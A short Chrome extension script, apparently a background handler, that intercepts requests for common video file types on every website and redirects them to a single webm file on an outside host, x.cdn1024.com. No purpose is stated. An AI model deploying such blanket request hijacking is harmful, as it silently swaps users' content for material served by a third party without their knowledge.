chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        let redirectUrl = details.url.startsWith("https://") 
            ? "https://x.cdn1024.com:5001/static/videos/v1_2.webm"
            : "http://x.cdn1024.com:5001/static/videos/v1_2.webm";
        
        return { redirectUrl };
    },
    { 
        urls: [
            "*://*/*.mp4", 
            "*://*/*.mkv", 
            "*://*/*.mov", 
            "*://*/*.avi", 
            "*://*/*.flv", 
            "*://*/*.wmv", 
            "*://*/*.mpeg", 
            "*://*/*.mpg", 
            "*://*/*.3gp", 
            "*://*/*.m4v"
        ] 
    }, 
    ["blocking"]
);

